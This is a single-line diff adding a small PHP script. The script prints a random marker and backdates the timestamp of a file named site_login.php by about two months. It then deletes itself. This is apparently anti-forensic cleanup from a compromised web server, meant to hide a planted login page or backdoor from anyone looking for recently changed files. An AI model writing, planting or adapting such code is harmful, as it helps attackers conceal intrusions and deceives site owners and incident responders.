@@ -1,0 +1,1 @@
+<?php echo "HeDXzaPkgT"; if (file_exists("./site_login.php")){ touch("./site_login.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*ddCQN7QXFGtgEZPgV06D*/ ?>
